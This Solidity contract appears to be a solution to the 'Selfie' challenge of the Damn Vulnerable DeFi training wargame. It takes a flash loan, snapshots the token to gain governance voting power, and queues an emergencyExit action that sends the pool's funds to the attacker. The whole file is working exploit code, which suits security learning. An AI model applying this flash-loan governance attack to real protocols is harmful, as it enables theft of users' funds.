// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract AttackSelfie {
    address public immutable attacker;
    SimpleGovernance public immutable gov;
    DamnValuableTokenSnapshot public immutable dvt;
    SelfiePool public immutable pool;
    uint256 public actionId;

    constructor(
        SimpleGovernance _gov,
        SelfiePool _pool,
        DamnValuableTokenSnapshot _dvt
    ) {
        attacker = msg.sender;
        gov = _gov;
        pool = _pool;
        dvt = _dvt;
    }

    function attack() external {
        // Ask loan
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(dvt),
            pool.maxFlashLoan(address(dvt)),
            ""
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        // Queue gov action
        // Take snapshot to have voting power updated
        DamnValuableTokenSnapshot(token).snapshot();
        // We will call emergency exit to withdraw all funds to attacker with enough voting power
        bytes4 selector = bytes4(keccak256(bytes("emergencyExit(address)")));
        bytes memory data = abi.encodeWithSelector(selector, attacker);
        actionId = gov.queueAction(msg.sender, 0, data);
        // approve for loan repaying with transferFrom
        DamnValuableTokenSnapshot(token).approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
